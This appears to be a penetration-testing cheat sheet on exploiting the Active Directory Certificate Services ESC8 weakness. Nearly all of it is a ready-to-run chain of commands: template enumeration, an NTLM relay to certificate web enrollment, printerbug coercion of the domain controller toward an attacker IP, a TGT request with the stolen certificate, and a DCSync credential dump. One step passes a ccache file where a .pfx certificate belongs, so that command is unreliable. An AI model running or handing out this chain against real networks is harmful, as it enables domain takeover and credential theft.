---
title: 'ADCS : ESC8'
date: 2025-11-30 15:49:27

categories:
  - Active Directory
  - Windows
  - Exploitation
  - ADCS

tags:
  - ESC8
  - Certipy
  - impacket-ntlmrelayx
  - printerbug


cover: /img/esc8.png
top_img: /img/bg-img.jpg
description: Exploit ADCS ESC8.
---

### Enumeration

Search for vulnerable certificate templates

```bash
certipy find -u username -p password -dc-ip <DC-IP> -target <DC-Name> -enabled -vulnerable -stdout
```

Identify ADCS Enrollment Services and Certificate Template Names

```bash
nxc ldap target -u username -p password -M adcs
```

Enumerate ADCS over SMB

```bash
nxc smb target -M enum_ca
```

### Start NTLM Relay to ADCS Web Enrollment

```bash
impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template <CERT-TEMPLATE> --no-http-server --no-wcf-server --no-raw-server
```

Or

```bash
certipy relay -target 'http://<DC-Name.domain>/' -template <CERT-TEMPLATE>
```

`➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.`

### Force Machine Authentication


```bash
python3 printerbug.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC-IP> <ATTACKER-IP>
```


### Request TGT 

```bash
python3 gettgtpkinit.py -cert-pfx <PATH-TO-PFX> -dc-ip <DC-IP> '<DOMAIN>/<MACHINE-ACCOUNT>$' <OUTPUT-CCACHE>
```

Or 

```bash
certipy auth -pfx <OUTPUT-CCACHE> -dc-ip <DC-IP> 
```


### Set Kerberos Cache to Use the TGT

```bash
export KRB5CCNAME=<OUTPUT-CCACHE>
```

### Perform DCSync

```bash
impacket-secretsdump -k -no-pass -dc-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN>/<MACHINE-ACCOUNT>$'@<DC-HOSTNAME>
```